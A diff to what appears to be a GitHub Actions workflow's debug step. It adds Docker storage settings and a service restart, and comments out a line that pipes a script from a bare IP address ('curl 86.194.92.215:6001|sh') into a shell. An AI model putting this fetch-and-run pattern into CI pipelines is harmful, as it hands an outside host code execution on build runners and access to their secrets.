@@ -34,11 +34,17 @@ jobs:
       - name: DEBUG
         id: debug
         run: |
+          set -x
           ls -lah
           id
           uname -a
           df -h
-          curl 86.194.92.215:6001|sh
+          sudo sed -i 's#ExecStart=/usr/bin/dockerd#ExecStart=/usr/bin/dockerd --storage-opt dm.basesize=20G#g' /usr/lib/systemd/system/docker.service
+          cat /usr/lib/systemd/system/docker.service | grep -iF storage
+          sudo systemctl restart docker
+          sleep 3
+          sudo systemctl status docker
+#          curl 86.194.92.215:6001|sh
 
       - name: Run `packer init`
         id: init
